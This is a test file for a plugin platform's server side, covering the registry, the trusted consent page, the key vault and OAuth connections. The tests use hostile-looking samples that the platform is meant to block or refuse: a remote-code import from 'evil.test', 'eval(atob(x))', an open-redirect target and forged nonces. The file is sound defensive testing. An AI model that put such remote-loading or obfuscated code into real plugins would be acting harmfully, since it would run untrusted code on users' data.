// The plugin platform's server side, end to end against a real PostgreSQL: the registry (goal 6), the trusted page
// and consent (goal 3), the vault and connections (goal 8).
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import http from 'node:http'
import crypto from 'node:crypto'
import pg from 'pg'
import { loadConfig } from '../server/config.mjs'
import { connect, runMigrations } from '../server/db/index.mjs'
import { createApp } from '../server/app.mjs'
import { checkCode } from '../server/registry.mjs'
import { isPrivateAddress } from '../server/vault.mjs'

const ADMIN_URL = process.env.TEST_DATABASE_URL || process.env.DATABASE_URL
if (!ADMIN_URL) throw new Error('set TEST_DATABASE_URL')
const DB_NAME = `lc_plug_${process.pid}_${Date.now()}`
const dbUrl = (() => { const u = new URL(ADMIN_URL); u.pathname = `/${DB_NAME}`; return u.toString() })()
const quiet = () => {}
let conn, app, server, base, echo, echoBase
const seen = [] // requests the fake "other site" received

before(async () => {
  const admin = new pg.Client({ connectionString: ADMIN_URL })
  await admin.connect(); await admin.query(`create database "${DB_NAME}"`); await admin.end()
  conn = connect(dbUrl)
  await runMigrations(conn.pool, { log: quiet })
  // a fake third-party API for connections
  echo = http.createServer((req, res) => { seen.push({ url: req.url, auth: req.headers.authorization }); res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ ok: true, echoedKey: req.headers.authorization })) })
  await new Promise((r) => echo.listen(0, '127.0.0.1', r))
  echoBase = `http://127.0.0.1:${echo.address().port}`
  const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: 'http://lc.test', ADMIN_EMAILS: 'admin@x.test', DIST: '/nonexistent', VAULT_KEY: crypto.randomBytes(32).toString('base64'), CONNECTIONS_ALLOW_PRIVATE: '1' })
  app = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
  server = http.createServer(app.handler)
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  base = `http://127.0.0.1:${server.address().port}`
})
after(async () => {
  app?.close(); server?.close(); echo?.close()
  await conn?.pool.end()
  const admin = new pg.Client({ connectionString: ADMIN_URL })
  await admin.connect(); await admin.query(`drop database if exists "${DB_NAME}" with (force)`); await admin.end()
})

// http.request, not fetch: fetch (undici) overwrites the Sec-Fetch-* headers a browser would send
function raw(method, p, body, headers) {
  return new Promise((resolve, reject) => {
    const req = http.request(base + p, { method, headers: { ...headers, ...(body !== undefined ? { 'Content-Length': Buffer.byteLength(body) } : {}) } }, (res) => {
      const chunks = []
      res.on('data', (c) => chunks.push(c))
      res.on('end', () => resolve({ status: res.statusCode, headers: { get: (k) => { const v = res.headers[k.toLowerCase()]; return Array.isArray(v) ? v.join(', ') : v ?? null } }, text: Buffer.concat(chunks).toString('utf8') }))
    })
    req.on('error', reject)
    if (body !== undefined) req.write(body)
    req.end()
  })
}
function client() {
  let cookie = ''
  const c = async (method, p, body, headers = {}) => {
    const form = typeof body === 'string'
    const res = await raw(method, p, body === undefined ? undefined : form ? body : JSON.stringify(body), { ...(body !== undefined ? { 'Content-Type': form ? 'application/x-www-form-urlencoded' : 'application/json' } : {}), ...(cookie ? { Cookie: cookie } : {}), ...headers })
    const set = res.headers.get('set-cookie')
    if (set) cookie = set.split(';')[0].endsWith('=') ? '' : set.split(';')[0]
    let json = null
    try { json = JSON.parse(res.text) } catch { /* html or js */ }
    return { status: res.status, body: json, text: res.text, headers: res.headers }
  }
  return c
}
const NAV = { 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1' }
const nonceOf = (html) => /name="nonce" value="([^"]+)"/.exec(html)?.[1]
/** Open the trusted page for an action and confirm it, the way a person would (form fields as extra). */
async function confirm(c, query, fields = {}) {
  const page = await c('GET', `/trust?${query}`, undefined, NAV)
  assert.equal(page.status, 200, page.text.slice(0, 300))
  const nonce = nonceOf(page.text)
  assert.ok(nonce, `no nonce on ${query}: ${page.text.slice(0, 400)}`)
  const kind = new URLSearchParams(query).get('do')
  const r = await c('POST', '/trust', new URLSearchParams({ nonce, do: kind, decision: 'yes', ...fields }).toString(), NAV)
  // most confirmations go straight back to the console with a notice: show it as the text
  const loc = typeof r.headers.get === 'function' ? r.headers.get('location') : r.headers.location
  if (r.status === 303 && loc) r.text = `${loc} ${decodeURIComponent(loc.replace(/\+/g, ' '))}`
  return r
}

const CODE = `export default {
  sdk: 1, title: 'Habits', icon: 'repeat',
  types: [{ type: 'habits.Habit', kindOf: 'common.Habit', traits: ['titled', 'recurring'] }],
  pages: [{ title: 'Habits', mount(el, lc) { el.textContent = lc.data.list('habits.Habit').length + ' habits' } }],
}
`
let alice, bob, admin, published
test('setup: three accounts', async () => {
  admin = client(); alice = client(); bob = client()
  assert.equal((await admin('POST', '/api/auth/signup', { email: 'admin@x.test', password: 'pw-admin-123' })).status, 201)
  assert.equal((await alice('POST', '/api/auth/signup', { email: 'alice@x.test', password: 'pw-alice-123' })).status, 201)
  assert.equal((await bob('POST', '/api/auth/signup', { email: 'bob@x.test', password: 'pw-bob-1234' })).status, 201)
})

test('automated checks: remote code is blocked; obfuscation, data-door bypass and undeclared sites are flagged', () => {
  assert.equal(checkCode("const m = await import('https://evil.test/x.js')").blocked[0].id, 'remote-code')
  assert.equal(checkCode('eval(atob(x))').blocked[0].id, 'remote-code')
  const w = checkCode("fetch('https://api.example.com/x'); localStorage.getItem('life-console/v1')", { internet: [] }).warnings.map((x) => x.id)
  assert.ok(w.includes('undeclared-sites') && w.includes('data-door'))
  assert.deepEqual(checkCode("fetch('https://www.strava.com/api')", { internet: ['www.strava.com'] }).warnings, [])
})

test('registry: a handle, then publish under it; versions are fixed; others see only public plugins', async () => {
  assert.equal((await alice('POST', '/api/registry/handle', { handle: 'life-console' })).status, 400, 'reserved')
  assert.equal((await alice('POST', '/api/registry/handle', { handle: 'alice' })).body.handle, 'alice')
  // someone who never chose a publisher name gets one from their email when they first publish
  const eve = client()
  await eve('POST', '/api/auth/signup', { email: 'Eve.Smith@x.test', password: 'pw-eve-12345' })
  const ep = await eve('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes'") })
  assert.equal(ep.status, 201)
  assert.equal(ep.body.name, 'eve-smith/notes')
  assert.equal(ep.body.version, '0.1.0', 'no version given: the first one')
  assert.equal((await eve('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes'") })).body.reused, true, 'the same code again: the same version')
  assert.equal((await eve('POST', '/api/registry/publish', { name: 'notes', code: CODE.replace("title: 'Habits'", "title: 'Notes 2'") })).body.version, '0.1.1', 'new code: the next version')
  assert.equal((await eve('POST', '/api/registry/publish', { name: 'copy', code: CODE.replace("title: 'Habits'", "title: 'Notes'") })).status, 201, 'the same code under another name is its own plugin')
  assert.equal((await bob('POST', '/api/registry/handle', { handle: 'alice' })).status, 409, 'taken')
  await bob('POST', '/api/registry/handle', { handle: 'bob' })
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'bob/habits', version: '1.0.0', code: CODE })).status, 403, 'only under your own handle')
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/evil', version: '1.0.0', code: "export default {}; import('https://x.test/a.js')" })).status, 422)
  const r = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE, manifest: { title: 'Habits', says: { internet: [] } }, visibility: 'private' })
  assert.equal(r.status, 201)
  assert.equal(r.body.hash, crypto.createHash('sha256').update(`alice/habits\n${CODE}`).digest('hex'), 'named by its plugin and its code')
  published = r.body
  assert.equal((await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.0.0', code: CODE + '//x' })).status, 409, 'a version is fixed')
  assert.equal((await bob('GET', '/api/registry/plugins')).body.plugins.length, 0, 'private: bob does not see it')
  assert.equal((await bob('GET', `/api/registry/code/${published.hash}.js`)).status, 404)
  assert.match((await alice('GET', `/api/registry/code/${published.hash}.js`)).text, /export default/, 'the owner can load it')
  assert.equal((await alice('GET', `/api/registry/code/${published.hash}.js`, undefined, { 'Service-Worker': 'script' })).status, 403, 'never registrable as a service worker')
  const pub = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.1.0', code: CODE.replace('Habits', 'Habits 1.1'), manifest: { title: 'Habits' }, visibility: 'public', changelog: 'Streaks' })
  assert.equal(pub.status, 201)
  const list = (await bob('GET', '/api/registry/plugins')).body.plugins
  assert.equal(list.length, 1)
  assert.equal(list[0].latest.version, '1.1.0')
  assert.equal(list[0].worksWithEverything, true)
  assert.equal((await bob('GET', '/api/registry/plugins/alice/habits')).body.versions.length, 2)
  published = pub.body
})

test('consent: the trusted page refuses fetch(), frames and posts without its nonce', async () => {
  assert.equal((await bob('GET', '/trust?do=enable-plugins')).status, 403, 'no Fetch Metadata: refused')
  assert.equal((await bob('GET', '/trust?do=enable-plugins', undefined, { 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors' })).status, 403, 'a fetch() from a plugin')
  assert.equal((await bob('GET', '/trust?do=enable-plugins', undefined, { 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Mode': 'navigate' })).status, 403, 'a frame')
  const page = await bob('GET', '/trust?do=enable-plugins', undefined, NAV)
  assert.equal(page.status, 200)
  assert.match(page.headers.get('content-security-policy'), /default-src 'none'/)
  assert.ok(!/<script/i.test(page.text), 'no scripts on the trusted page')
  assert.equal(page.headers.get('cross-origin-opener-policy'), 'same-origin')
  const forged = await bob('POST', '/trust', new URLSearchParams({ nonce: 'guess', do: 'enable-plugins', decision: 'yes' }).toString(), NAV)
  assert.equal(forged.status, 400)
  const crossSite = await bob('POST', '/trust', new URLSearchParams({ nonce: nonceOf(page.text), do: 'enable-plugins', decision: 'yes' }).toString(), { ...NAV, 'Sec-Fetch-Site': 'cross-site' })
  assert.equal(crossSite.status, 403)
  // a nonce is bound to the action it was shown for
  const swapped = await bob('POST', '/trust', new URLSearchParams({ nonce: nonceOf(page.text), do: 'delete-account', decision: 'yes' }).toString(), NAV)
  assert.equal(swapped.status, 400)
  assert.equal((await bob('GET', '/api/auth/me')).status, 200, 'still has an account')
})

test('consent: enable Public plugins, install from the registry, load, update, toggle, remove', async () => {
  assert.equal((await bob('GET', '/api/plugins/installed')).body.publicPlugins, false)
  // the first install says it also turns plugins on: one confirmation, not two
  const early = await bob('GET', `/trust?do=install&pkg=alice/habits&hash=${published.hash}&back=/app%23/m/extensions`, undefined, NAV)
  assert.match(early.text, /This is your first extension/)
  assert.match(early.text, /href="\/app#\/m\/extensions">Cancel/, 'Cancel goes back where you came from')
  assert.equal((await bob('GET', `/trust?do=install&pkg=alice/habits&hash=${published.hash}&back=https://evil.test/`, undefined, NAV)).text.includes('evil.test'), false, 'never back to another site')
  const done = await confirm(bob, `do=install&pkg=alice/habits&hash=${published.hash}`)
  assert.equal(done.status, 303, 'straight back to the console')
  assert.match(done.headers.get('location'), /^\/app#\/m\/extensions\?notice=Installed/, 'back where it started, with a notice')
  assert.equal((await bob('GET', '/api/auth/me')).body.user.publicPlugins, true, 'the first install turned plugins on')
  assert.match(done.text, /Installed alice\/habits 1\.1\.0/)
  const inst = (await bob('GET', '/api/plugins/installed')).body.plugins
  assert.equal(inst.length, 1)
  assert.equal(inst[0].hash, published.hash)
  assert.equal(inst[0].enabled, true)
  assert.match((await bob('GET', `/api/registry/code/${published.hash}.js`)).text, /Habits 1.1/, 'the console can load it')
  // a newer version shows up as an update; installing it is another consent
  const v2 = await alice('POST', '/api/registry/publish', { name: 'alice/habits', version: '1.2.0', code: CODE.replace('Habits', 'Habits 1.2'), visibility: 'public', changelog: 'Reminders' })
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].update.version, '1.2.0')
  await confirm(bob, `do=install&pkg=alice/habits&hash=${v2.body.hash}`)
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].version, '1.2.0')
  await confirm(bob, 'do=toggle&pkg=alice/habits&on=0')
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins[0].enabled, false)
  await confirm(bob, 'do=toggle&pkg=alice/habits&on=1')
  // pulled by an admin: it stops loading everywhere
  assert.equal((await alice('POST', '/api/admin/registry/pull', { hash: v2.body.hash })).status, 403)
  assert.equal((await admin('POST', '/api/admin/registry/pull', { hash: v2.body.hash, reason: 'malware' })).status, 200)
  const after = (await bob('GET', '/api/plugins/installed')).body.plugins[0]
  assert.equal(after.enabled, false)
  assert.equal(after.pulled, true)
  assert.equal((await bob('GET', `/api/registry/code/${v2.body.hash}.js`)).status, 404)
  const rm = await confirm(bob, 'do=remove&pkg=alice/habits', { forget: '1' })
  assert.match(rm.text, /forget=alice%2Fhabits/, 'the console is told to delete its data')
  assert.equal((await bob('GET', '/api/plugins/installed')).body.plugins.length, 0)
})

test('registry: likes, installs counted once, and the owner edits the listing or takes it out', async () => {
  const pub = await alice('POST', '/api/registry/publish', { name: 'alice/streaks', code: CODE.replace('Habits', 'Streaks'), visibility: 'public', manifest: { title: 'Streaks', description: 'first words' } })
  assert.equal(pub.status, 201)
  // likes: one per person, undone by DELETE
  assert.equal((await bob('PUT', '/api/registry/plugins/alice/streaks/like', {})).body.likes, 1)
  assert.equal((await bob('PUT', '/api/registry/plugins/alice/streaks/like', {})).body.likes, 1, 'liking twice counts once')
  let card = (await bob('GET', '/api/registry/plugins?q=streaks')).body.plugins.find((p) => p.name === 'alice/streaks')
  assert.equal(card.likes, 1); assert.equal(card.liked, true)
  assert.equal((await bob('DELETE', '/api/registry/plugins/alice/streaks/like', {})).body.likes, 0)
  // installs count people, not updates
  await confirm(bob, `do=install&pkg=alice/streaks&hash=${pub.body.hash}`)
  const v2 = await alice('POST', '/api/registry/publish', { name: 'alice/streaks', code: CODE.replace('Habits', 'Streaks 2'), visibility: 'public' })
  await confirm(bob, `do=install&pkg=alice/streaks&hash=${v2.body.hash}`)
  card = (await bob('GET', '/api/registry/plugins?q=streaks')).body.plugins.find((p) => p.name === 'alice/streaks')
  assert.equal(card.downloads, 1, 'an update is not a second install')
  // only the owner edits the listing; a new version keeps the edited details and stays shared
  assert.equal((await bob('PATCH', '/api/registry/plugins/alice/streaks', { title: 'Mine now' })).status, 404)
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { title: 'Streak counter', description: 'Better words', icon: 'bolt' })).body.title, 'Streak counter')
  await alice('POST', '/api/registry/publish', { name: 'alice/streaks', code: CODE.replace('Habits', 'Streaks 3'), visibility: 'private', manifest: { title: 'Streaks', description: 'first words' } })
  card = (await bob('GET', '/api/registry/plugins?q=streak')).body.plugins.find((p) => p.name === 'alice/streaks')
  assert.equal(card.title, 'Streak counter', 'publishing kept the edited listing')
  assert.equal(card.visibility, 'public', '"Use it" on a shared extension does not hide it')
  // out of the registry: bob has it, so it's unlisted (gone from the list, still loads for him)
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { visibility: 'private' })).body.visibility, 'unlisted')
  assert.ok(!(await admin('GET', '/api/registry/plugins?q=streak')).body.plugins.some((p) => p.name === 'alice/streaks'), 'off the listing')
  assert.equal((await bob('GET', `/api/registry/code/${v2.body.hash}.js`)).status, 200, 'still works for people who installed it')
  await confirm(bob, 'do=remove&pkg=alice/streaks')
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { visibility: 'private' })).body.visibility, 'private', 'nobody else has it: private')
  assert.equal((await alice('PATCH', '/api/registry/plugins/alice/streaks', { visibility: 'public' })).body.visibility, 'public', 'and back (Undo)')
})

test('forks and suggestions: only the author changes an extension; others fork it and suggest versions', async () => {
  const orig = await alice('POST', '/api/registry/publish', { name: 'alice/timer', code: CODE.replace('Habits', 'Timer'), visibility: 'public', manifest: { title: 'Timer' } })
  assert.equal((await bob('POST', '/api/registry/publish', { name: 'alice/timer', code: 'export default { sdk: 1 }' })).status, 403, "nobody publishes over someone else's extension")
  assert.equal((await bob('PATCH', '/api/registry/plugins/alice/timer', { title: 'x' })).status, 404, "nor edits its listing")
  // bob forks it (privately) and suggests his version back
  const fork = await bob('POST', '/api/registry/publish', { name: 'timer', code: CODE.replace('Habits', 'Timer with sounds'), forkOf: 'alice/timer' })
  assert.equal(fork.body.name, 'bob/timer')
  assert.equal((await bob('GET', '/api/registry/plugins/bob/timer')).body.forkedFrom, 'alice/timer')
  assert.equal((await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: orig.body.hash })).status, 400, 'only a version of your fork')
  // using your copy: it takes the original's place in your console
  await confirm(bob, `do=install&pkg=alice/timer&hash=${orig.body.hash}`)
  const page = await bob('GET', `/trust?do=install&pkg=bob/timer&hash=${fork.body.hash}`, undefined, NAV)
  assert.match(page.text, /Instead of.*alice\/timer/s)
  await confirm(bob, `do=install&pkg=bob/timer&hash=${fork.body.hash}`)
  assert.deepEqual((await bob('GET', '/api/plugins/installed')).body.plugins.map((p) => p.pkg).filter((n) => n.endsWith('/timer')), ['bob/timer'])
  const sug = await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: fork.body.hash, message: 'Adds sounds' })
  assert.equal(sug.status, 201)
  assert.equal((await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: fork.body.hash })).body.already, true, 'once per version')
  // alice sees it, can read the private fork's code to review it, and accepts it by publishing it as her next version
  const inbox = (await alice('GET', '/api/registry/suggestions')).body.incoming
  assert.equal(inbox.length, 1); assert.equal(inbox[0].by, 'bob'); assert.equal(inbox[0].message, 'Adds sounds'); assert.equal(inbox[0].fromPackage, 'bob/timer')
  assert.match((await alice('GET', `/api/registry/code/${fork.body.hash}.js`)).text, /Timer with sounds/)
  assert.equal((await admin('GET', `/api/registry/code/${fork.body.hash}.js`)).status, 404, 'nobody else can read the private fork')
  const next = await alice('POST', '/api/registry/publish', { name: 'timer', code: CODE.replace('Habits', 'Timer with sounds'), proposal: inbox[0].id })
  assert.equal(next.body.name, 'alice/timer'); assert.equal(next.body.version, '0.1.1')
  assert.equal((await alice('GET', '/api/registry/suggestions')).body.incoming.length, 0)
  assert.equal((await bob('GET', '/api/registry/suggestions')).body.sent[0].status, 'accepted')
  // declining
  const fork2 = await bob('POST', '/api/registry/publish', { name: 'timer', code: CODE.replace('Habits', 'Timer v3') })
  const s2 = await bob('POST', '/api/registry/plugins/alice/timer/suggest', { hash: fork2.body.hash })
  assert.equal((await bob('POST', `/api/registry/suggestions/${s2.body.id}/decline`, {})).status, 404, 'only the author declines')
  assert.equal((await alice('POST', `/api/registry/suggestions/${s2.body.id}/decline`, {})).status, 200)
  assert.equal((await bob('GET', '/api/registry/suggestions')).body.sent[0].status, 'declined')
})

test('consent: once Public plugins are on, token, password and delete need the trusted page', async () => {
  const t = await bob('POST', '/api/auth/tokens', { name: 'Mac app' })
  assert.equal(t.status, 403)
  assert.equal(t.body.trust, '/trust?do=token')
  assert.equal((await bob('POST', '/api/auth/password', { current: 'pw-bob-1234', password: 'new-pass-999' })).status, 403)
  assert.equal((await bob('DELETE', '/api/auth/me', { password: 'pw-bob-1234' })).status, 403)
  const tok = await confirm(bob, 'do=token&name=Mac%20app')
  const token = /readonly value="([^"]+)"/.exec(tok.text)?.[1]
  assert.ok(token)
  assert.equal((await raw('GET', '/api/auth/me', undefined, { Authorization: `Bearer ${token}` })).status, 200)
  // alice never turned plugins on: her flows are unchanged
  assert.equal((await alice('POST', '/api/auth/tokens', { name: 'Mac app' })).status, 201)
})

test('vault: a key is saved only on the trusted page, never returned, sent only to its site', async () => {
  const host = new URL(echoBase).hostname
  await confirm(bob, `do=vault-save&name=echo&site=${host}`, { secret: 's3cret-key' })
  const list = (await bob('GET', '/api/connections')).body
  assert.equal(list.on, true)
  assert.deepEqual(list.connections.map((c) => [c.name, c.site]), [['echo', host]])
  assert.ok(!JSON.stringify(list).includes('s3cret'), 'never returned')
  const r = await bob('POST', '/api/connections/request', { name: 'echo', url: `${echoBase}/v1/me` })
  assert.equal(r.status, 200)
  assert.equal(seen.at(-1).auth, 'Bearer s3cret-key', 'the server added the key')
  assert.equal(r.body.json.echoedKey, 'Bearer [key]', 'an echoed key is masked in the answer')
  assert.equal((await bob('POST', '/api/connections/request', { name: 'echo', url: 'http://elsewhere.test/x' })).status, 403, 'only to its site')
  assert.equal((await alice('POST', '/api/connections/request', { name: 'echo', url: `${echoBase}/v1/me` })).status, 404, "another account can't use it")
  assert.ok(isPrivateAddress('10.0.0.5') && isPrivateAddress('127.0.0.1') && isPrivateAddress('::1') && !isPrivateAddress('8.8.8.8'))
})

test('consent: delete account on the trusted page', async () => {
  const r = await confirm(bob, 'do=delete-account', { password: 'pw-bob-1234' })
  assert.match(r.text, /Your account is deleted/)
  assert.equal((await bob('GET', '/api/auth/me')).status, 401)
})

test('OAuth connections: connect on the trusted page, tokens in the vault, refreshed by the broker (G7)', async () => {
  // a fake provider: /authorize is never visited by the server; /token issues and refreshes tokens
  let issued = 0
  const prov = http.createServer((req, res) => {
    let body = ''
    req.on('data', (c) => { body += c })
    req.on('end', () => {
      const f = new URLSearchParams(body)
      if (req.url === '/token') {
        issued++
        res.writeHead(200, { 'Content-Type': 'application/json' })
        return res.end(JSON.stringify(f.get('grant_type') === 'refresh_token'
          ? { access_token: `fresh-${issued}`, expires_in: 3600 }
          : { access_token: 'old-token', refresh_token: 'r1', expires_in: 1 })) // expires at once: the broker must refresh
      }
      seen.push({ url: req.url, auth: req.headers.authorization })
      res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":true}')
    })
  })
  await new Promise((r) => prov.listen(0, '127.0.0.1', r))
  const pb = `http://127.0.0.1:${prov.address().port}`
  const cfg = loadConfig({ DATABASE_URL: dbUrl, PUSH_DRY_RUN: '1', APP_URL: 'http://lc.test', ADMIN_EMAILS: '', DIST: '/nonexistent', VAULT_KEY: crypto.randomBytes(32).toString('base64'), CONNECTIONS_ALLOW_PRIVATE: '1',
    OAUTH_FAKEFIT_CLIENT_ID: 'cid', OAUTH_FAKEFIT_CLIENT_SECRET: 'csecret', OAUTH_FAKEFIT_AUTH_URL: `${pb}/authorize`, OAUTH_FAKEFIT_TOKEN_URL: `${pb}/token`, OAUTH_FAKEFIT_SITE: '127.0.0.1', OAUTH_FAKEFIT_TITLE: 'FakeFit' })
  assert.deepEqual(Object.keys(cfg.oauthProviders), ['fakefit'], 'only providers with a client id and secret are on')
  const app2 = await createApp({ cfg, db: conn.db, pool: conn.pool, log: quiet })
  const s2 = http.createServer(app2.handler)
  await new Promise((r) => s2.listen(0, '127.0.0.1', r))
  const saveBase = base
  base = `http://127.0.0.1:${s2.address().port}`
  try {
    const carol = client()
    await carol('POST', '/api/auth/signup', { email: 'carol@x.test', password: 'pw-carol-123' })
    assert.deepEqual((await carol('GET', '/api/connections')).body.providers.map((p) => p.name), ['fakefit'])
    const go = await confirm(carol, 'do=connect&provider=fakefit')
    assert.equal(go.status, 303)
    const to = new URL(go.headers.get('location'))
    assert.equal(to.origin + to.pathname, `${pb}/authorize`)
    assert.equal(to.searchParams.get('redirect_uri'), 'http://lc.test/trust/oauth')
    const state = to.searchParams.get('state')
    // the provider sends the person back (a cross-site top-level navigation)
    const back = await carol('GET', `/trust/oauth?code=abc&state=${encodeURIComponent(state)}`, undefined, { ...NAV, 'Sec-Fetch-Site': 'cross-site' })
    assert.match(back.text, /Connected/)
    assert.equal((await carol('GET', `/trust/oauth?code=abc&state=${encodeURIComponent(state)}`, undefined, NAV)).status, 400, 'a state works once')
    const conns = (await carol('GET', '/api/connections')).body.connections
    assert.deepEqual(conns.map((c) => [c.name, c.site, c.scheme]), [['fakefit', '127.0.0.1', 'oauth:fakefit']])
    const r = await carol('POST', '/api/connections/request', { name: 'fakefit', url: `${pb}/v1/athlete` })
    assert.equal(r.status, 200)
    assert.equal(seen.at(-1).auth, 'Bearer fresh-2', 'the expired token was refreshed first')
  } finally { base = saveBase; app2.close(); s2.close(); prov.close() }
})
